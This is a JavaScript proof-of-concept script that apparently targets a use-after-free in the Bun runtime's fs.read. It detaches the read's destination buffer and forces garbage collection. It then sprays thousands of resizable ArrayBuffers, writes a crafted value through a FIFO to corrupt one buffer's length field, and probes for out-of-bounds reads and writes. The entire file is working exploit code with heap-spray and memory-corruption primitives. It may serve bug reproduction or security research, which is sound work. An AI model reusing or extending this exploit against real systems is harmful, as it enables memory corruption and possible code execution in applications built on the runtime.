import fs from "node:fs";
import { spawnSync } from "node:child_process";
import { join } from "node:path";
import { tmpdir } from "node:os";

const iterations = Number(process.env.ITERATIONS || 64);
const uafSize = Number(process.env.UAF_SIZE || 128);
const initialLength = Number(process.env.RAB_INITIAL || 128);
const maxLength = Number(process.env.RAB_MAX || 256);
const viewOffset = Number(process.env.VIEW_OFFSET || 0);
const viewLength = Number(process.env.VIEW_SIZE || (initialLength - viewOffset));
const sprayCount = Number(process.env.SPRAY_COUNT || 8192);
const writeOffset = Number(process.env.WRITE_OFFSET || 48);
const writeLength = Number(process.env.WRITE_LENGTH || 8);
const newValue = BigInt(process.env.NEW_VALUE || String(maxLength));
const touchMode = process.env.TOUCH_MODE || "read";
const probeOffset = Number(process.env.PROBE_OFFSET || initialLength);
const resizeTo = Number(process.env.RESIZE_TO || maxLength);
const writeValue = Number(process.env.WRITE_VALUE || 0x5a);
const path = join(tmpdir(), `bun-fs-read-rab-expanded-oob-${process.pid}`);
const retained = [];

if (viewOffset + viewLength > initialLength) {
  throw new Error("VIEW_OFFSET + VIEW_SIZE must fit inside RAB_INITIAL");
}
if (initialLength >= maxLength) {
  throw new Error("RAB_MAX must be larger than RAB_INITIAL");
}
if (writeOffset < 0 || writeLength <= 0 || writeOffset + writeLength > uafSize) {
  throw new Error("WRITE_OFFSET/WRITE_LENGTH must fit inside UAF_SIZE");
}

const mkfifo = spawnSync("mkfifo", [path], { stdio: "inherit" });
if (mkfifo.status !== 0) throw new Error(`mkfifo failed with status ${mkfifo.status}`);
const fd = fs.openSync(path, fs.constants.O_RDWR);

function detach(ab) {
  if (typeof ab.transfer === "function") ab.transfer(0);
  else structuredClone({}, { transfer: [ab] });
}

function gcNow() {
  if (typeof globalThis.Bun?.gc === "function") globalThis.Bun.gc(true);
  if (typeof globalThis.gc === "function") globalThis.gc();
}

function makePayload() {
  const payload = Buffer.alloc(writeLength, 0);
  let value = newValue;
  for (let i = 0; i < Math.min(writeLength, 8); i++) {
    payload[i] = Number(value & 0xffn);
    value >>= 8n;
  }
  return payload;
}

function readField(fn) {
  try {
    return fn();
  } catch (error) {
    return `threw:${error?.message || error}`;
  }
}

function makeTarget(index) {
  const fill = (0x90 + (index & 15)) & 0xff;
  const tail = (0xc0 + (index & 15)) & 0xff;
  const ab = new ArrayBuffer(maxLength, { maxByteLength: maxLength });
  const whole = new Uint8Array(ab);
  whole.fill(fill, 0, initialLength);
  whole.fill(tail, initialLength, maxLength);
  ab.resize(initialLength);
  return new Uint8Array(ab, viewOffset, viewLength);
}

function allocateTargets() {
  retained.length = 0;
  for (let i = 0; i < sprayCount; i++) retained.push(makeTarget(i));
}

function summarizeProbe(target, index) {
  const fill = (0x90 + (index & 15)) & 0xff;
  const tail = (0xc0 + (index & 15)) & 0xff;
  const ab = target.buffer;
  const before = {
    viewLength: readField(() => target.length),
    viewByteLength: readField(() => target.byteLength),
    viewByteOffset: readField(() => target.byteOffset),
    bufferByteLength: readField(() => ab.byteLength),
    maxByteLength: readField(() => ab.maxByteLength),
    first: readField(() => target[0]),
    lastInView: readField(() => target[viewLength - 1]),
  };

  const changed =
    before.viewLength !== viewLength ||
    before.viewByteLength !== viewLength ||
    before.viewByteOffset !== viewOffset ||
    before.bufferByteLength !== initialLength ||
    before.maxByteLength !== maxLength ||
    before.first !== fill ||
    before.lastInView !== fill;

  if (!changed) return null;

  const expanded = readField(() => {
    const alias = new Uint8Array(ab);
    const out = {
      mode: touchMode,
      length: alias.length,
      byteLength: alias.byteLength,
      readAtProbeOffset: touchMode === "construct" || touchMode.startsWith("resize") ? undefined : alias[probeOffset],
      expectedTail: tail,
    };
    if (touchMode.startsWith("resize")) {
      out.resizeTo = resizeTo;
      ab.resize(resizeTo);
      const grown = new Uint8Array(ab);
      out.afterResizeLength = grown.length;
      out.afterResizeReadAtProbeOffset = grown[probeOffset];
      if (touchMode === "resize-write") {
        grown[probeOffset] = writeValue;
        out.afterResizeWriteAtProbeOffset = grown[probeOffset];
      }
      return out;
    }
    if (touchMode === "write") {
      alias[probeOffset] = writeValue;
      out.afterWriteAtProbeOffset = alias[probeOffset];
      out.resizeAfterWrite = readField(() => {
        ab.resize(maxLength);
        const grown = new Uint8Array(ab);
        return grown[probeOffset];
      });
    }
    return out;
  });

  return { before, expanded };
}

function findChanged() {
  for (let i = 0; i < retained.length; i++) {
    const probe = summarizeProbe(retained[i], i);
    if (probe) return { index: i, ...probe };
  }
  return null;
}

async function runOne(iteration) {
  const ab = new ArrayBuffer(uafSize);
  const source = new Uint8Array(ab);
  source.fill(0x51);

  const done = new Promise(resolve => {
    fs.read(fd, source, writeOffset, writeLength, null, (err, bytesRead) => resolve({ err, bytesRead }));
  });

  detach(ab);
  gcNow();
  allocateTargets();
  gcNow();

  fs.writeSync(fd, makePayload(), 0, writeLength);
  const result = await done;
  const changed = findChanged();

  console.log(JSON.stringify({
    iteration,
    uafSize,
    initialLength,
    maxLength,
    viewOffset,
    viewLength,
    sprayCount,
    writeOffset,
    writeLength,
    newValue: `0x${newValue.toString(16)}`,
    touchMode,
    probeOffset,
    resizeTo,
    bytesRead: result.bytesRead,
    err: result.err?.message,
    changed,
  }));

  return Boolean(changed);
}

let interesting = false;
try {
  for (let i = 1; i <= iterations; i++) {
    if (await runOne(i)) {
      interesting = true;
      break;
    }
  }
} finally {
  fs.closeSync(fd);
  fs.unlinkSync(path);
}

process.exitCode = interesting ? 86 : 0;
